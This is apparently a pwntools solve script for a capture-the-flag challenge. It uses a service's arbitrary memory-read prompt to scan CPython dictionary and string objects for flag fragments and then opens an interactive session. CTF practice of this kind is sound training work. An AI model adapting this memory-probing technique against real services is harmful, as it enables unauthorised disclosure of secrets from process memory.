from pwn import *
import re

HOST = 'zerodayheroes-74cbaa42-doityourself2.kongsberg-ctf.com'
PORT = 1337

context.log_level = 'info'

# Connect via SSL as instructed
io = remote(HOST, PORT, ssl=True)

# receive the banner lines
intro = io.recvline_contains(b'flag is over at').decode()
print(intro.strip())

# consume the second banner line about python version
banner2 = io.recvline().decode()
print(banner2.strip())

m = re.search(r'flag is over at (0x[0-9a-fA-F]+)', intro)
if not m:
    print('could not find base address')
    exit(1)

base = int(m.group(1), 16)
print(f'base = {hex(base)}')

# helper to read 8 bytes from address using the service
def read8(addr):
    # send hex address (service expects hex input)
    s = hex(addr)
    print(f'Sending: {s}')
    io.sendline(s.encode())
    # service prints: 0x{addr:012x}: {hexbytes}\n
    line = io.recvline(timeout=2).decode().strip()
    print(f'Received: {line}')
    # parse after the colon
    try:
        _, data = line.split(': ')
        data = data.strip()
        print(f'Hex data: {data}')
    except ValueError:
        print(f'Parse error on line: {line}')
        return None
    # turn into bytes
    try:
        raw = bytes.fromhex(data)
        print(f'Parsed bytes: {raw.hex()}')
        return raw
    except ValueError as e:
        print(f'Hex parse error: {e}')
        return None

# We'll use up to 50 reads; the service allows 50 prompts and then exits
# First, probe the object header area to find pointers inside the dict
reads = []
for off in range(0, 0x100, 8):  # Scan more of the dict structure
    b = read8(base + off)
    if b is None:
        break
    reads.append((base + off, b))
    val = u64(b)
    print(f'[{hex(base+off)}] {b.hex()} -> {val:#x}')

# Look for pointers that could be to strings or dict entries
# In CPython dict layout, we're looking for dk_entries pointer and individual PyUnicodeObject pointers
candidates = []
for addr, b in reads:
    val = u64(b)
    # More aggressive pointer detection - look for any reasonable heap address
    if 0x400000 < val < 0x800000000000:  # Expanded range for pointers
        candidates.append(val)
        print(f'  -> Found candidate pointer: {val:#x}')

print('candidates:', [hex(x) for x in candidates])

found = set()
# remaining reads: we used len(reads)
used = len(reads)
max_reads = 50

print(f'Found {len(candidates)} pointer candidates, using {used}/{max_reads} reads so far')

for i, cand in enumerate(candidates[:10]):  # Limit to first 10 candidates
    if used >= max_reads - 5:  # Save some reads for final attempts
        break
    print(f'Scanning candidate {i+1}: {cand:#x}')
    
    # Scan around the candidate, looking for string objects
    for j in range(-2, 10):  # Scan before and after the candidate
        if used >= max_reads - 2:
            break
        addr = cand + j*8
        b = read8(addr)
        used += 1
        if not b:
            continue
        
        val = u64(b)
        # Check if bytes contain printable ASCII
        printable_chars = []
        for byte in b:
            if 32 <= byte <= 126:
                printable_chars.append(chr(byte))
            elif byte == 0:
                printable_chars.append('\\0')
            else:
                printable_chars.append('.')
        
        s = ''.join(printable_chars)
        print(f'  {addr:#x}: {b.hex()} -> "{s}" (as ptr: {val:#x})')
        
        # Look for flag-like patterns
        ascii_only = ''.join(chr(x) for x in b if 32 <= x <= 126)
        if len(ascii_only) >= 3 and any(c in ascii_only for c in 'flag{}'):
            found.add((addr, ascii_only))
            print(f'    *** Potential flag fragment: "{ascii_only}"')
        
        # If this looks like a pointer to another object, try reading there too
        if 0x400000 < val < 0x800000000000 and used < max_reads - 1:
            b2 = read8(val)
            used += 1
            if b2:
                s2 = ''.join(chr(x) if 32 <= x <= 126 else '.' for x in b2)
                print(f'    -> {val:#x}: {b2.hex()} -> "{s2}"')
                ascii_only2 = ''.join(chr(x) for x in b2 if 32 <= x <= 126)
                if len(ascii_only2) >= 2:
                    found.add((val, ascii_only2))

if found:
    print('likely printable fragments found:')
    for addr, frag in sorted(found):
        print(hex(addr), frag)
else:
    print('no obvious printable fragments found; consider scanning other candidates or tuning offsets')

print('done; interactive prompt follows. You can continue probing manually if needed.')
# Drop into interactive mode to allow manual probing if desired
io.interactive()
